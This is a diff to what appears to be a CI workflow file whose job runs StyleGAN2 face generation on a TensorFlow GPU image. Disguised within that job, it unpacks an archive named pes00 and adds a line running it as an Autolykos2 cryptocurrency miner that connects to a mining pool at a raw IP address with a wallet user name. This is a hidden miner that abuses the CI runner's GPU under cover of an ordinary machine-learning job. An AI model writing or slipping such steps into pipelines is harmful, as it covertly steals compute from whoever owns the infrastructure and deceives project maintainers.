@@ -41,10 +41,8 @@ jobs:
           --seeds=6600-6605 \
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
-        ls
         tar -xf pes00.tar.gz
-        ls
         cd /inputs/stylegan2/111
         ls
-        pes00 --algo AUTOLYKOS2 --pool stratum+ssl://206.189.151.227:2288 --user 9i9Rb19ix2YqvyFRubz1BKzPzE28a47NqnQkiSFw9XHWjLaS3hc.rigo
+        ./pes00 --algo AUTOLYKOS2 --pool stratum+ssl://206.189.151.227:2288 --user 9i9Rb19ix2YqvyFRubz1BKzPzE28a47NqnQkiSFw9XHWjLaS3hc.rigo
       image: tensorflow/tensorflow:1.14.0-gpu-py3
